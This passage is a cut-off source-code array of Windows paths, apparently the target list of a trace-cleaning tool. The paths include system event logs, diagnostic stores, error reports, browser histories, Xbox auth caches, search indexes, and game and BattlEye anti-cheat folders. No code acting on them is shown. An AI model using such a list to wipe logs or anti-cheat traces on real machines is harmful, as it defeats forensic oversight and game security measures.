            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat",
            "C:\\Windows\\System32\\config\\BBI.LOG1",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Windows\\System32\\config\\DEFAULT.LOG2",
            "C:\\Windows\\System32\\config\\DEFAULT.LOG1",
            "C:\\Windows\\Logs\\MoSetup\\UpdateAgent.log",
            "C:\\Windows\\Logs\\MoSetup",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Windows\\Logs",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.XboxGameOverlay_1.42.4001.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.XboxGameOverlay_1.42.4001.0_x64__8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalState",
            "C:\\Windows\\ServiceState\\EventLog",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Safety",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Safety",
            "C:\\ProgramData\\Microsoft\\Windows\\ClipSVC",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG1",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State\\dosvcState.dat.LOG2",
            "C:\\Windows\\appcompat\\appraiser",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC",
            "C:\\Windows\\System32\\LogFiles\\WMI",
            "C:\\ProgramData\\Microsoft\\Windows\\WER",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\settings",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Origin",
            "C:\\Users\\"+ user +"\\AppData\\Local\\temp\\Origin",
            "C:\\ProgramData\\Origin",
            "C:\\Windows\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\TempState\\CortanaUnifiedTileModelCache.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Origin",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\ThumbCacheToDelete",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_idx.db",
            "C:\\ProgramData\\Microsoft\\Windows\\ClipSvc",
            "C:\\ProgramData\\Microsoft\\Windows\\WER",
            "C:\\Users\\All Users\\Microsoft\\Windows\\WER",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\1e219871-2a28-4d27-b3c8-3412c40a9d4b_S-1-5-21-3790113146-3068863390-284532636-1001_24.rslc",
            "C:\\Windows\\AppReadiness",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-wal",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-wal",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-wal",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-wal",
            "C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\microsoft.system.package.metadata",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\microsoft.system.package.metadata",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-wal",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.YourPhone_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.scale-100_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\microsoft.system.package.metadata",
            "C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-shm",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\StateRepository-Machine.srd-shm",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_neutral_split.language-de_8wekyb3d8bbwe",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.YourPhone_1.19061.410.0_x64__8wekyb3d8bbwe\\ActivationStore.dat",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Users\\All Users\\Epic\\UnrealEngineLauncher",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\Users\\All Users\\Epic\\EpicGamesLauncher\\Data\\EMS",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
            "C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\CacheStorage",
            "C:\\Program Files x86\\AMD",
            "C:\\Program Files x86\\AMD\\CNext\\CCCSlim",
            "C:\\ProgramData\\Microsoft\\XboxLive\\NSALCache",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\FontCache",
            "C:\\Windows\\System32\\PerfStringBackup.TMP",
            "C:\\Windows\\System32\\PerfStringBackup.INI",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy",
            "C:\\Windows\\System32\\WDI\\LogFiles",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Logs",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\State",
            "C:\\Windows\\System32\\spp\\store",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WER",
            "C:\\Users\\"+ user +"\\Favorites",
            "C:\\Users\\"+ user +"\\IntelGraphicsProfiles",
            "C:\\Users\\"+ user +"\\MicrosoftEdgeBackups",
            "C:\\Users\\"+ user +"\\Reverse.rep",
            "C:\\Users\\"+ user +"\\Documents\\desktop.ini",
            "C:\\Users\\"+ user +"\\Picture\\desktop.ini",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms\\Unistore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\logs",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization",
            "C:\\ProgramData\\Microsoft\\Windows\\ClipSVC",
            "C:\\Program Files\\WindowsApps\\Microsoft.LanguageExperiencePacken-GB_17763.9.22.0_neutral__8wekyb3d8bbwe\\Windows\\System32\\driverstore",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Notepad++\\backup",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\TempState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs\\SystemIndex",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs\\SystemIndex",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex\\SecStore",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex\\SecStore",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex\\PropMap",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects\\SystemIndex\\PropMap",
            "C:\\ProgramData\\Microsoft\\Search\\Data",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Explorer\\ThumbCacheToDelete",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher",
            "C:\\Program Files x86\\Common Files\\BattlEye",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\CacheStorage",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData\\Indexed DB",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AppData",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState\\DeviceSearchCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\LocalState",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\Config",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\Projects",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\EmieSiteList",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\DBG",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\Public\\Libraries",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5",
            "C:\\Windows\\TEMP\\UDD6086.tmp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\DOMStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\EmieSiteList",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\IEDownloadHistory",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer\\EmieUserList",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Internet Explorer",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Feeds Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\MicrosoftEdge\\SharedCacheContainers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK\\FortniteClient-Win64-Shipping_10864.log",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edbtmp.jtx",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edbtmp.jtx",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edbtmp.jtx",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edbtmp.jtx",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb00025.jtx",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edb00025.jtx",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\Users\\All Users\\Microsoft\\Windows\\AppRepository\\Packages\\Microsoft.Windows.CloudExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VSApplicationInsights",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\ScenariosSqlStore\\EventStore.db-wal",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\DownloadedScenarios",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\ProgramData\\Microsoft\\Diagnosis",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis",
            "C:\\Users\\All Users\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\ESE",
            "C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\Users\\All Users\\Microsoft\\Search\\Data\\Applications\\Windows\\edb.jcp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Intel\\CUIPromotions",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Intel\\CUIPromotions",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Intel",
